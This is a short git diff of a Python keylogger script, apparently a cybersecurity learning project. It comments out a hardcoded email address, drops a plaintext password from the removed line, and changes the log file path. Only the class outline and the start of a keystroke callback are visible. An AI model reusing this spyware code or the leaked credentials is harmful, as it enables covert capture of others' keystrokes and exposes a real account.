@@ -6,8 +6,8 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
 SEND_REPORT_EVERY = 30  # in seconds, 60 means 1 minute and so on
-EMAIL_ADDRESS = "kapoorpiyush0103@outlook.com"
-EMAIL_PASSWORD = "kapoor65231992"
+# EMAIL_ADDRESS = "kapoorpiyush0103@outlook.com"
+# EMAIL_PASSWORD = ""
 
 class Keylogger:
     def __init__(self, interval, report_method="file"):
@@ -21,7 +21,7 @@ class Keylogger:
     def generate_filename(self):
         start_str = self.start_dt.strftime("%Y-%m-%d-%H-%M-%S")
         end_str = self.end_dt.strftime("%Y-%m-%d-%H-%M-%S")
-        return f"d:/Cyber_security_internship_tasks/keylogger/keylog-{start_str}_{end_str}"
+        return f"D:/Cyber_security_projects/keylogger/keylog-{start_str}_{end_str}"
 
     def callback(self, event):
         name = event.name
